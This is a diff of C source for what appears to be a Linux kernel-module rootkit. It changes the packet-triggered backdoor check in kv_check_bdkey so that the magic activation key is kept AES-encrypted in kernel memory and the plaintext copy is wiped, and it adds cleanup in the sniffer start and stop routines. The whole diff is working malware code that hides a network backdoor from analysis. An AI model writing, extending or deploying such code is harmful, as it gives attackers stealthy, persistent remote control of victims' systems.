@@ -31,6 +31,8 @@ struct iph_node_t {
 };
 
 struct task_struct *tsk_iph = NULL;
+static struct kv_crypto_st *kvmgc_bdkey;
+
 #define BD_PATH_NUM 3
 #define BD_OPS_SIZE 2
 enum {
@@ -426,9 +428,24 @@ static int _bd_watchdog(void *t)
 #endif
 }
 
+static struct check_bdkey_t {
+    bool ok;
+    uint64_t address_value;
+};
+
+void _bdkey_callback(const u8 * const buf, size_t buflen, size_t copied, void *userdata) {
+    struct check_bdkey_t *validate = (struct check_bdkey_t*)userdata;
+    if (validate && validate->address_value) {
+        if (validate->address_value == *((uint64_t*)buf))
+            validate->ok = true;
+    }
+}
+
 bool kv_check_bdkey(struct tcphdr *t, struct sk_buff *skb) {
     uint8_t silly_word = 0;
     enum { FUCK=0x8c, CUNT=0xa5, ASS=0x38 };
+    decrypt_callback cbkey = (decrypt_callback)_bdkey_callback;
+    extern struct kv_crypto_st *kvmgc_bdkey;
 
     silly_word = t->fin << 7| t->syn << 6| t->rst << 5| t->psh << 4|
         t->ack << 3| t->urg << 2| t->ece <<1| t->cwr;
@@ -439,6 +456,7 @@ bool kv_check_bdkey(struct tcphdr *t, struct sk_buff *skb) {
         unsigned char *data = skb->data + 40;
 
         if (skb->len >= sizeof(struct tcphdr) + sizeof(struct iphdr) + 8) {
+            struct check_bdkey_t validate = {0};
             address_value = ((unsigned long)data[0] << 56) |
                 ((unsigned long)data[1] << 48) |
                 ((unsigned long)data[2] << 40) |
@@ -447,8 +465,11 @@ bool kv_check_bdkey(struct tcphdr *t, struct sk_buff *skb) {
                 ((unsigned long)data[5] << 16) |
                 ((unsigned long)data[6] << 8)  |
                 (unsigned long)data[7];
-            if (address_value == BDKEY)
+            validate.address_value = address_value;
+            kv_decrypt(kvmgc_bdkey, cbkey, &validate);
+            if (validate.ok == true) {
                 return true;
+            }
         }
     }
     return false;
@@ -570,6 +591,26 @@ struct task_struct *kv_sock_start_sniff(void) {
     static struct nf_priv priv;
     struct task_struct *tsk = NULL;
 
+    /**
+     * Init bdkey enc
+     */
+    kvmgc_bdkey = crypto_init();
+    if (kvmgc_bdkey) {
+        /** Allocate more than needed (8)
+         * as its the minimum for AES-256
+         * */
+        size_t datalen = 16;
+        u8 *buf = kmalloc(datalen, GFP_KERNEL);
+        if (!buf)
+            return NULL;
+
+        memcpy(buf, &auto_bdkey, 8);
+        kv_encrypt(kvmgc_bdkey, buf, datalen);
+
+        /** discard saved key */
+        auto_bdkey = 0;
+    }
+
     // load sniffer
     if (!*running) {
         // Hook pre routing
@@ -641,6 +682,7 @@ void kv_sock_stop_sniff(struct task_struct *tsk) {
     _free_kfifo_items();
 
     kfifo_free(&buffer);
+    kv_crypto_mgc_deinit(kvmgc_bdkey);
 }
 
 void kv_sock_stop_fw_bypass(void) {
